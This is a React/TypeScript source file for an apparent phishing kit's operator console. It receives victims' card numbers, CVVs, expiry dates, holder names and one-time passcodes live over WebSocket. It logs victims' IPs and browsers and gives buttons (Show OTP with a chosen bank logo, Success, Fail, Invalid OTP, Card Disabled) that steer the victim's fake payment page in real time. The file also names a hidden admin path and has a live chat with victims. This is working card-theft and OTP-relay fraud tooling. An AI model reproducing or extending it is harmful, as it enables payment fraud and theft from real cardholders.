import React, { useState, useEffect, useMemo } from 'react';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from './ui/table';
import { wsClient } from '@/integrations/ws-client';
import TypingDetector from './TypingDetector';
import EnhancedVisitorInfo from './EnhancedVisitorInfo';
import AdminChat from './AdminChat';

import BankSelectionModal from './BankSelectionModal';

interface CardSubmission {
  id: string;
  invoice_id: string;
  card_number: string;
  expiry_month: string;
  expiry_year: string;
  cvv: string;
  card_holder: string;
  amount: string;
  user_ip: string;
  browser: string;
  network: string;
  otp?: string;
  created_at: string;
  isNew?: boolean;
}

interface Visitor {
  id: string;
  ip: string;
  created_at: string;
}

const AdminPanel = () => {
  const [cardSubmissions, setCardSubmissions] = useState<CardSubmission[]>(() => {
    const savedSubmissions = localStorage.getItem('card_submissions');
    const savedCommands = localStorage.getItem('admin_commands');
    const initialCommands = savedCommands ? JSON.parse(savedCommands) : {};
    let parsedSubmissions: CardSubmission[] = [];
    try {
      parsedSubmissions = savedSubmissions ? JSON.parse(savedSubmissions) : [];
    } catch (e) {
      console.error("Failed to parse card submissions from localStorage", e);
    }
    
    // Filter out submissions that have already been commanded
    return parsedSubmissions.map(submission => ({
      ...submission,
      isNew: !(initialCommands[submission.id] && initialCommands[submission.id].length > 0)
    }));
  });
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [activeVisitors, setActiveVisitors] = useState<Visitor[]>([]);
  const [connectionStatus, setConnectionStatus] = useState<string>('Connected');
  const [notification, setNotification] = useState<string>('');
  const [newVisitorGlow, setNewVisitorGlow] = useState<boolean>(false);
  const [showBankModal, setShowBankModal] = useState(false);
  const [selectedSubmissionId, setSelectedSubmissionId] = useState<string>('');
  const [adminCommands, setAdminCommands] = useState<{ [submissionId: string]: string[] }>(() => {
    const savedCommands = localStorage.getItem('admin_commands');
    return savedCommands ? JSON.parse(savedCommands) : {};
  });

  // Save admin commands to localStorage whenever they change
  useEffect(() => {
    localStorage.setItem('admin_commands', JSON.stringify(adminCommands));
  }, [adminCommands]);

  // Save card submissions to localStorage whenever they change
  useEffect(() => {
    localStorage.setItem('card_submissions', JSON.stringify(cardSubmissions));
  }, [cardSubmissions]);

  const showNotification = (message: string) => {
    setNotification(message);
    setTimeout(() => setNotification(''), 3000);
  };

  useEffect(() => {
    const handleConnect = () => {
      setConnectionStatus('Connected');
      console.log('[AdminPanel] WebSocket connected, sending admin_hello.');
      wsClient.send('admin_hello', {});
    };

    const handleDisconnect = () => {
      setConnectionStatus('Disconnected');
      console.log('[AdminPanel] WebSocket disconnected.');
    };

    const handleCardSubmission = (submission: CardSubmission) => {
      console.log('[AdminPanel] Received card_submission:', submission);
      setCardSubmissions(prev => {
        const updatedSubmissions = [{ ...submission, isNew: true, created_at: new Date().toISOString() }, ...prev];
        return updatedSubmissions;
      });
      showNotification('New card submission received');
    };

    const handleOtpSubmitted = (data: { submission_id: string; otp: string }) => {
      console.log('[AdminPanel] Received otp_submitted:', data);
      setCardSubmissions(prev =>
        prev.map(s => (s.id === data.submission_id ? { ...s, otp: data.otp } : s))
      );
    };

    const handleVisitorUpdate = (visitor: Visitor) => {
      console.log('[AdminPanel] Received visitor_update:', visitor);
      const myId = wsClient.getSocketId();
      if (visitor.id === myId) return;
      setActiveVisitors(prev => {
        const updatedVisitors = prev.find(v => v.id === visitor.id) ? prev : [...prev, visitor];
        setNewVisitorGlow(true); // Activate glow on new visitor
        return updatedVisitors;
      });
    };

    const handleVisitorLeft = (payload: { id: string }) => {
      console.log('[AdminPanel] Received visitor_left:', payload.id);
      const myId = wsClient.getSocketId();
      if (payload.id === myId) return;
      setActiveVisitors(prev => {
        const updatedVisitors = prev.filter(v => v.id !== payload.id);
        if (updatedVisitors.length === 0) {
          setNewVisitorGlow(false); // Turn off glow if no visitors left
        }
        return updatedVisitors;
      });
    };

    const handleDeleteAllTransactions = () => {
      console.log('[AdminPanel] Deleting all transactions');
      setCardSubmissions([]);
      setAdminCommands({});
      localStorage.removeItem('card_submissions');
      showNotification('All transactions deleted');
    };

    const handleAdminCommand = (command: any) => {
      console.log('[AdminPanel] Received admin_command:', command);
      if (command.submission_id) {
        setAdminCommands(prev => ({
          ...prev,
          [command.submission_id]: [...(prev[command.submission_id] || []), command.command]
        }));
      }
    };

    // Register all event listeners
    wsClient.on('card_submission', handleCardSubmission);



    // If the socket is already connected (possible if connection event fired before listener registration),
    // immediately perform the connect handler logic to join the 'admins' room and request any queued data.
    if (wsClient.socket?.connected) {
      handleConnect();
    }
    wsClient.on('otp_submitted', handleOtpSubmitted);
    wsClient.on('visitor_update', handleVisitorUpdate);
    wsClient.on('visitor_left', handleVisitorLeft);
    wsClient.on('delete_all_transactions', handleDeleteAllTransactions);
    wsClient.on('admin_command', handleAdminCommand);
    wsClient.socket.on('connect', handleConnect);
    wsClient.socket.on('disconnect', handleDisconnect);

    // Connect if not already connected
    if (wsClient.socket.connected) {
      handleConnect();
    } else {
      wsClient.connect();
    }

    // Set custom favicon for admin panel only
    const favicon = document.createElement('link');
    favicon.rel = 'icon';
    favicon.type = 'image/png';
    favicon.href = 'https://static.thenounproject.com/png/74031-200.png';
    document.head.appendChild(favicon);

    // Load submissions from localStorage on mount
    const saved = localStorage.getItem('card_submissions');
    if (saved) {
      try {
        setCardSubmissions(JSON.parse(saved));
      } catch (err) {
        console.error('[AdminPanel] Failed to parse saved submissions', err);
      }
    }

    // Cleanup function
    return () => {
      console.log('[AdminPanel] Cleaning up and disconnecting.');
      // Remove all listeners
      wsClient.off('card_submission', handleCardSubmission);
      wsClient.off('otp_submitted', handleOtpSubmitted);
      wsClient.off('visitor_update', handleVisitorUpdate);
      wsClient.off('visitor_left', handleVisitorLeft);
      wsClient.off('delete_all_transactions', handleDeleteAllTransactions);
      wsClient.off('admin_command', handleAdminCommand);
      wsClient.socket.off('connect', handleConnect);
      wsClient.socket.off('disconnect', handleDisconnect);

      // Disconnect the socket
      if (wsClient.socket.connected) {
        wsClient.disconnect();
      }

      // Remove favicon
      document.head.removeChild(favicon);
    };
    }, []);

  // Periodic cleanup of stale visitors (older than 2 minutes)
  useEffect(() => {
    const interval = setInterval(() => {
      setActiveVisitors(prev => prev.filter(v => Date.now() - new Date(v.created_at).getTime() < 120000));
    }, 30000);
    return () => clearInterval(interval);
  }, []);

  const sendCommand = (command: string, submissionId?: string, bankData?: { name: string; logo: string }) => {
    console.log('Admin Panel: Sending command:', command, submissionId, bankData);
    showNotification(`${command.toUpperCase()} command sent`);
    
    // Ensure we have a valid socket ID
    if (!submissionId) {
      console.error('No submission ID provided');
      return;
    }

    const commandData = {
      command,
      submission_id: submissionId,
      created_at: new Date().toISOString(),
    } as any;
    if (bankData) {
      commandData.bank_name = bankData.name;
      commandData.bank_logo = bankData.logo;
    }
    
    console.log('Admin Panel: Sending command to socket ID:', submissionId, commandData);
    wsClient.send('admin_command', commandData);
    
    if (submissionId) {
      setCardSubmissions(prev => prev.map(submission => 
        submission.id === submissionId ? { ...submission, isNew: false } : submission
      ));
    }
  };

  const handleRowClick = (submissionId: string) => {
    setCardSubmissions(prev => prev.map(submission => 
      submission.id === submissionId ? { ...submission, isNew: false } : submission
    ));
  };

  const deleteAllTransactions = () => {
    if (window.confirm('Are you sure you want to delete all transactions? This action cannot be undone.')) {
      wsClient.send('delete_all_transactions', {});
      setCardSubmissions([]);
      showNotification('All transactions deleted successfully');
    }
  };

  const handleShowOtp = (submissionId: string) => {
    console.log('Admin Panel: Show OTP clicked for submission:', submissionId);
    setSelectedSubmissionId(submissionId);
    setShowBankModal(true);
  };

  const handleBankSelect = (bankName: string, bankLogo: string) => {
    console.log('Admin Panel: Bank selected:', bankName, bankLogo);
    console.log('Admin Panel: Sending showotp command with submission ID:', selectedSubmissionId);
    sendCommand('showotp', selectedSubmissionId, { name: bankName, logo: bankLogo });
    setShowBankModal(false);
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white p-4">
      {/* Connection Status */}
      <div className="flex items-center gap-2 mb-4">
        <span className="text-sm">Connection Status:</span>
        <span className={`px-2 py-1 rounded ${
          connectionStatus === 'Connected' ? 'bg-green-600' : 
          connectionStatus === 'Connecting' ? 'bg-yellow-600' : 
          'bg-red-600'
        }`}>
          {connectionStatus}
        </span>
      </div>

      {/* Live Visitor Count */} 
      <div className="fixed top-4 left-4 z-50">
        <div className={`relative w-16 h-16 rounded-full flex items-center justify-center text-white font-bold text-xl transition-all duration-300 ${newVisitorGlow ? 'bg-blue-600 shadow-lg animate-pulse' : 'bg-gray-700'}`}>
          {activeVisitors.length}
          {activeVisitors.length === 1 ? ' Visitor' : ' Visitors'}
        </div>
      </div>

      {/* Notifications */}
      {notification && (
        <div className="fixed top-4 right-4 bg-blue-600 text-white px-4 py-2 rounded-lg shadow-lg">
          {notification}
        </div>
      )}
      <BankSelectionModal
        isOpen={showBankModal}
        onClose={() => setShowBankModal(false)}
        onSelectBank={handleBankSelect}
        submissionId={selectedSubmissionId}
      />
      
      <div className="flex justify-between items-center mb-8">
        <h1 className="text-3xl font-bold">a</h1>
        <button
          onClick={deleteAllTransactions}
          className="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded"
        >
          Delete Transactions
        </button>
      </div>
      
      {/* Card Submissions Section */}
      <div className="bg-gray-800 rounded-lg p-4 mb-4 shadow-lg">
        <h2 className="text-xl font-bold mb-4">Card Submissions</h2>
        {cardSubmissions.length > 0 ? (
          <div className="space-y-4">
            {cardSubmissions.map((submission) => (
              <div
                key={submission.id}
                className={`bg-gray-700 rounded-lg p-4 ${submission.isNew ? 'animate-pulse border-2 border-yellow-500' : ''}`}
                onClick={() => setSelectedSubmissionId(submission.id)}
              >
                <div className="grid grid-cols-2 gap-4 mb-4">
                  <div className="col-span-2">
                    <div className="flex items-center justify-between">
                      <span className="text-gray-400 text-sm">Card Number</span>
                      <button 
                        onClick={(e) => {
                          e.stopPropagation();
                          navigator.clipboard.writeText(submission.card_number);
                          showNotification('Card number copied!');
                        }}
                        className="text-blue-400 hover:text-blue-300 text-sm"
                      >
                        Copy
                      </button>
                    </div>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.card_number}</div>
                  </div>
                  
                  <div>
                    <span className="text-gray-400 text-sm">CVV</span>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.cvv}</div>
                  </div>
                  
                  <div>
                    <span className="text-gray-400 text-sm">Card Holder</span>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.card_holder}</div>
                  </div>
                  
                  <div>
                    <span className="text-gray-400 text-sm">Expiry Month</span>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.expiry_month}</div>
                  </div>
                  
                  <div>
                    <span className="text-gray-400 text-sm">Expiry Year</span>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.expiry_year}</div>
                  </div>
                  
                  <div>
                    <span className="text-gray-400 text-sm">Amount</span>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.amount}</div>
                  </div>
                  
                  <div>
                    <span className="text-gray-400 text-sm">OTP</span>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.otp || 'N/A'}</div>
                  </div>
                  
                  <div>
                    <span className="text-gray-400 text-sm">Browser</span>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.browser}</div>
                  </div>
                  
                  <div>
                    <span className="text-gray-400 text-sm">User IP</span>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.user_ip}</div>
                  </div>
                  
                  <div>
                    <span className="text-gray-400 text-sm">Network</span>
                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.network}</div>
                  </div>
                </div>

                {/* Action Buttons */}
                {!(adminCommands[submission.id]?.includes('success') || adminCommands[submission.id]?.includes('fail')) && (
                  <div className="grid grid-cols-2 gap-2 mb-4">
                    <button
                      onClick={(e) => { e.stopPropagation(); handleShowOtp(submission.id); }}
                      className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-3 rounded text-sm w-full"
                    >
                      Show OTP
                    </button>
                    <button
                      onClick={(e) => { e.stopPropagation(); sendCommand('fail', submission.id); }}
                      className="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-3 rounded text-sm w-full"
                    >
                      Fail
                    </button>
                    <button
                      onClick={(e) => { e.stopPropagation(); sendCommand('success', submission.id); }}
                      className="bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-3 rounded text-sm w-full"
                    >
                      Success
                    </button>
                    <button
                      onClick={(e) => { e.stopPropagation(); sendCommand('invalidotp', submission.id); }}
                      className="bg-yellow-600 hover:bg-yellow-700 text-white font-bold py-2 px-3 rounded text-sm w-full"
                    >
                      Invalid OTP
                    </button>
                    <button
                      onClick={(e) => { e.stopPropagation(); sendCommand('cardinvalid', submission.id); }}
                      className="bg-purple-600 hover:bg-purple-700 text-white font-bold py-2 px-3 rounded text-sm w-full"
                    >
                      Card Invalid
                    </button>
                    <button
                      onClick={(e) => { e.stopPropagation(); sendCommand('carddisabled', submission.id); }}
                      className="bg-orange-600 hover:bg-orange-700 text-white font-bold py-2 px-3 rounded text-sm w-full"
                    >
                      Card Disabled
                    </button>
                  </div>
                )}
              </div>
            ))}
          </div>
        ) : (
          <div className="text-gray-400 text-center py-4">No card submissions yet...</div>
        )}
      </div>
      
      {/* Instructions */}
      <div className="bg-gray-800 p-4 rounded">
        <h3 className="text-lg font-bold mb-2">Instructions</h3>
        <ul className="text-sm space-y-1">
          <li>• Admin panel is now accessible at /parking55009hvSweJimbs5hhinbd56y</li>
          <li>• Real-time communication via Supabase database</li>
          <li>• Wait for card data to appear in the table above</li>
          <li>• Click on any row to stop the glow effect</li>
          <li>• Use command buttons to control user experience</li>
          <li>• All transactions are saved in Supabase database</li>
          <li>• Cross-browser sessions supported via real-time subscriptions</li>
          <li>• Visitors are automatically removed after 2 minutes of inactivity</li>
          <li>• Click the chat button to start live chat with users</li>
        </ul>
      </div>

      <AdminChat />
    </div>
  );
};

export default AdminPanel;
